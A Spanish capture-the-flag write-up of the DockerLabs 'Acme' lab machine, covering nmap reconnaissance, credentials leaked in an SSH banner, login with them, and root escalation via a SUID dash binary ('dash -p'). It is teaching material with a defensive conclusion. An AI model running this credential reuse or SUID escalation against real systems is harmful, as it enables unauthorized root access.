# Writeup: DockerLabs - Acme (Dificultad Fácil)

## 📝 Introducción
En este writeup detallo el proceso de resolución de la máquina **Acme** de la plataforma DockerLabs. La máquina presenta un nivel de dificultad fácil y pone a prueba habilidades básicas de enumeración web, análisis de información expuesta en banners de servicios (SSH), y escalada de privilegios mediante el abuso de binarios con el bit SUID activo.

---

## 🚀 Despliegue de la Máquina
Para comenzar, desplegamos la máquina utilizando el script proporcionado por DockerLabs.

```bash
sudo bash auto_deploy.sh acme.tar
```
Una vez desplegada, la máquina obtiene la dirección IP `172.17.0.3`.

---

## 🔍 Reconocimiento (Reconnaissance)
El primer paso es realizar un escaneo de puertos y servicios para identificar la superficie de ataque.

```bash
nmap -sS -sV -sC -Pn -n -p- 172.17.0.3
```
Resultados del escaneo:
- **Puerto 22 (SSH):** `OpenSSH 8.9p1 Ubuntu 3ubuntu0.16`.
- **Puerto 80 (HTTP):** `Apache httpd 2.4.52` (Título: ACME Corporation - Portal en Mantenimiento).
- **Hallazgo:** El script de Nmap detecta un archivo `robots.txt` que contiene una entrada de directorio no permitida: `/migration_notes.txt`.

---

## 🕵️ Enumeración (Enumeration)

### 1. Enumeración Web
Sabiendo que existe un archivo oculto gracias al escaneo del `robots.txt`, procedemos a inspeccionar su contenido realizando una petición con curl.

```bash
curl [http://172.17.0.3/migration_notes.txt](http://172.17.0.3/migration_notes.txt)
```
Resultado obtenido:
```text
================================================================================
MEMORANDO DE MIGRACION DE INFRAESTRUCTURA - ACME CORP
================================================================================
Estado: Migracion interna activa
Aviso: El acceso a este servidor se canaliza por SSH (puerto 22).
Consulte el banner de conexion de SSH para obtener las instrucciones del nodo.
================================================================================
```
El equipo de TI ha dejado instrucciones explícitas en el **banner de conexión de SSH**. Esto nos indica que el servidor nos mostrará un mensaje revelador antes de pedir la contraseña.

### 2. Enumeración SSH (Banner Grabbing)
Para visualizar el banner, lanzamos una petición de conexión SSH con un usuario aleatorio (por ejemplo, `russoski`).

```bash
ssh russoski@172.17.0.3
```
Al aceptar el fingerprint, el servidor nos devuelve el siguiente banner:
```text
===================================================================
[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno
[!] AVISO DE SEGURIDAD Y ACCESO:
[!] Portal corporativo en proceso de migracion a infraestructura interna.
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!
===================================================================
```
¡Excelente! El banner expone credenciales válidas en texto claro.

---

## 💥 Explotación (Exploitation)
Con las credenciales descubiertas, procedemos a conectarnos de forma legítima al servidor.

```bash
ssh usuario@172.17.0.3
# Password: P@ssw0rd2026_CTF!
```
Una vez dentro de la máquina como el usuario `usuario`, listamos el directorio y obtenemos la flag.

```bash
ls
cat user.txt
```
Flag de usuario:
```text
FLAG{nmap_recon_ssh_foothold_7a9f24e1}
```

---

## 👑 Escalada de Privilegios (Privilege Escalation)
Para escalar privilegios a root, buscamos archivos en el sistema que tengan el **bit SUID** activado. Esto nos permite ejecutar binarios con los permisos de su propietario original.

```bash
find / -perm -4000 -type f 2>/dev/null
```
Salida del comando (truncada):
```text
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/bash
/usr/bin/dash
/usr/bin/chsh
/usr/bin/sudo
```
Llama la atención el binario `/usr/bin/dash` (una shell del sistema). Cuando una shell tiene el bit SUID activado, podemos invocarla con el parámetro `-p` (privilegiado) para mantener los permisos de root sin que el sistema los elimine durante la sesión.

```bash
dash -p
```
Verificamos nuestra identidad:
```bash
# whoami
root
```
¡Máquina comprometida con éxito! Obtenemos una shell interactiva como el usuario root.

---

## 📌 Conclusión
La máquina Acme nos enseña la importancia de:
- **Revisar fugas de información:** Analizar archivos como `robots.txt` que a menudo exponen rutas sensibles de la infraestructura.
- **Configurar servicios de forma segura:** Evitar dejar credenciales por defecto o temporales en banners de conexión (MoTD) que están expuestos a cualquier atacante sin autenticación.
- **Auditar permisos locales:** Revisar sistemáticamente el bit SUID para evitar que binarios críticos (como las shells `dash` o `bash`) permitan escalar privilegios fácilmente.

¡Happy Hacking! 🐧💻
